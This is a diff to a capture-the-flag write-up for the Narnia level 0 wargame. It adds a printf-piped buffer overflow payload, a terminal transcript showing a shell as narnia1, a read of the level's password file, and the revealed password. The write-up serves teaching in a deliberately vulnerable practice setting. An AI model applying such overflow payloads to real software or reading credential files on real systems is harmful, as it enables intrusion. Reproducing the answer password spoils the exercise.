@@ -60,4 +60,17 @@ Using this command we can add some random 20 letters in the starting and hex con
 
        (printf "arunarunarunarun\xef\xbe\xad\xde" ; cat) | ./narnia0
 
-printf command is a shell command that pre process the hex values and execute . Using this command this level can be solved
+printf command is a shell command that pre process the hex values and execute . Using this command you can get into the shell of the narnia 1 
+```
+narnia0@narnia:/narnia$ (printf "arunarunarunarunarun\xef\xbe\xad\xde" ; cat) | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: arunarunarunarunarunﾭ�
+val: 0xdeadbeef
+whoami
+narnia1
+cat /etc/narnia_pass/narnia1
+WDcYUTG5ul
+```
+
+# Password 
+     WDcYUTG5ul
